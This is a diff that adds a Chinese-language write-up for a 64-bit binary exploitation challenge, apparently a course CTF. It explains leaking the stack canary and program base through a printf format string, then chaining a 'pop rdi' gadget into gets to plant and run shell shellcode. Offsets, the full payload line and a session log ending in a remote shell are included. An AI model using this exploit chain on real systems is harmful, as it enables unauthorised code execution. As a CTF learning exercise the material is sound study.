@@ -1,0 +1,140 @@
+這次執行檔是64bit 所以記憶體位置是8 byte 使用pwntools
+ELF info:
+
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled
+
+想法:
+
+1.利用printf找出global base，以及canary的值
+2.將shellcode注入global variable的name
+3.利用gets跳到name去執行
+
+詳細作法:
+1.
+用printf 
+參數設定%24$p -> 64bit addr,這個是main上層的rbp，跟mask 0x000做and之後就是global base
+參數設定%23$p -> 64bit addr,這個是main這一層的canary
+可以用來推算lib function以及global variable的addr
+
+2.
+使用gets注入shellcode到name，gets接受rdi作為buf的addr
+所以找到一個'pop rdi'的gadget就可以使用gets注入shellcode
+'pop rdi' gadget offset :	0xda3
+gets function offset 	:	0x908
+name variable offset	:	0x202020
+
+需要注意asm shellcode時要根據執行檔設定一些參數
+context.os == 'linux'
+context.endian = 'little'
+shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64')
+
+3.
+使用gdb觀察canary以及ret addr的位置
+計算出需要的輸入
+gadget = p64(base + 0xda3)
+name = p64(base + 0x202020)
+gets_addr = p64(base + 0x908)
+payload = 'A'*136 + p64(canary) + 'B'*8 + gadget + name + gets_addr + name + '\n'
+
+程式執行流程
+input 3
+input %23$p,%24$p	#得到canary及global base
+input 2
+input 3
+input payload
+input shellcode
+這樣就得到shell了
+
+而main在ret時<main+315>
+其stack如下圖，左邊為原本的值，右邊是修改後的值
+
+stcak:
+-----------------------------------------------
++0xa8	,..		,	ret addr to name
++0xa0	,..		,	ret addr to gets
++0x98	,..		,	pop &name to rdi
++0x90	,ret addr	,	gadget addr
++0x88	,rbp		,	'A'*8
++0x80	,canary		,	canary
+------------------------------------------------
+
+ret_pwn.py使用
+from ret_pwn import *
+r = ret_pwn()
+r.connect()
+#推算出base
+r.attack(base,canary)
+
+例子
+>>> from ret_pwn import *
+>>> r = ret_pwn()
+[x] Opening connection to csie.ctf.tw on port 10122
+[x] Opening connection to csie.ctf.tw on port 10122: Trying 140.112.31.96
+[+] Opening connection to csie.ctf.tw on port 10122: Done
+>>> r.connect()
+*******************
+ 1. Set name       
+ 2. Show info      
+ 3. Save data      
+ 4. Exit           
+*******************
+> Your name:
+*******************
+ 1. Set name       
+ 2. Show info      
+ 3. Save data      
+ 4. Exit           
+*******************
+> Name:
+0x7fa5b1db6d40 0xc002ddaea656e000*******************
+ 1. Set name       
+ 2. Show info      
+ 3. Save data      
+ 4. Exit           
+*******************
+> 
+>>> r.re() #如果pip有延遲的話 再收一次完整的recv()
+>>> r.attack(0x7fa5b1db6000,0xc002ddaea656e000)
+Your data:*******************
+ 1. Set name       
+ 2. Show info      
+ 3. Save data      
+ 4. Exit           
+*******************
+> 
+canary : 0xc002ddaea656e000
+name addr : 0x7fa5b1fb8020
+gadget : 0x7fa5b1db6da3
+gets_addr : 0x7fa5b1db6908
+
+[*] Switching to interactive mode
+ls
+bin
+boot
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+
+
+
